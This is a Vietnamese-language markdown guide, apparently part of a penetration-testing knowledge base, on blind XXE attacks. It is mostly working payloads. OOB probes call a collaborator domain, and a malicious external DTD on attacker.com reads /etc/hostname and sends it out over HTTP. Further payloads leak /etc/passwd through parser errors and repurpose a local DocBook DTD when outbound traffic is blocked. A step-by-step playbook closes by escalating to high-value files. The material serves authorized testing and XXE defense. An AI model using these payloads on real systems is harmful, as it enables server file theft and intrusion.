# Blind XXE và Exfiltration Ngoài Băng (OOB)

## Khái Niệm Blind XXE

Blind XXE xảy ra khi parser vẫn resolve entity nhưng ứng dụng không trả về giá trị entity trong response. Khi đó, attacker phải dựa vào:

- OOB network interactions (DNS/HTTP/FTP)
- Parser errors có dữ liệu chèn trong thông điệp lỗi

## Giai Đoạn 1: Phát Hiện OOB

### Probe Thực Thể Tổng Quát

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://COLLABORATOR_DOMAIN">
]>
<foo>&xxe;</foo>
```

### Probe Thực Thể Tham Số

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://COLLABORATOR_DOMAIN">
  %xxe;
]>
<foo>1</foo>
```

Nếu có interaction, blind XXE khả thi.

## Giai Đoạn 2: OOB Exfiltration Qua External DTD Độc Hại

### Payload XML Chính

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd">
  %xxe;
]>
<foo>1</foo>
```

### malicious.dtd (Exfiltration Qua HTTP)

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
```

## Xử Lý Ràng Buộc Newline và URL

Một số parser không cho ký tự newline trong URL exfil. Cách xử lý:

- Ưu tiên file ngắn (`/etc/hostname`) để xác nhận pipeline
- Chuyển sang FTP-based exfil cho payload dài
- Nếu có PHP wrapper, cân nhắc base64 để ổn định dữ liệu

## Giai Đoạn 3: Trích Xuất Dữ Liệu Dựa Trên Lỗi

Khi ứng dụng trả parser errors, có thể leak data qua nonexistent path.

### Biến Thể External DTD

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Kết quả kỳ vọng: error message chứa fragment nội dung file.

## Giai Đoạn 4: Tái Mục Đích Local DTD (Không Có Outbound)

Khi outbound bị chặn:

1. Tìm DTD file tồn tại trên host (`/usr/share/.../*.dtd`, ...).
2. Nạp local DTD bằng `SYSTEM "file:///..."`.
3. Redefine một parameter entity đã được khai báo trong DTD đó.
4. Trigger error-based leakage.

### Payload Khung Mẫu

```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;
  '>
  %local_dtd;
]>
<foo>1</foo>
```

## Playbook Vận Hành

1. Xác nhận blind signal (OOB hit).
2. Dùng external DTD để exfil file ngắn.
3. Mở rộng sang file target giá trị cao.
4. Nếu outbound bị chặn, chuyển local DTD repurpose.
5. Chốt impact bằng bằng chứng tái hiện được.

## Tệp Liên Quan

- [03-detection.md](03-detection.md)
- [04-exploitation-workflow.md](04-exploitation-workflow.md)
- [09-bypass-and-advanced-techniques.md](09-bypass-and-advanced-techniques.md)
- [10-payloads-cheatsheet.md](10-payloads-cheatsheet.md)
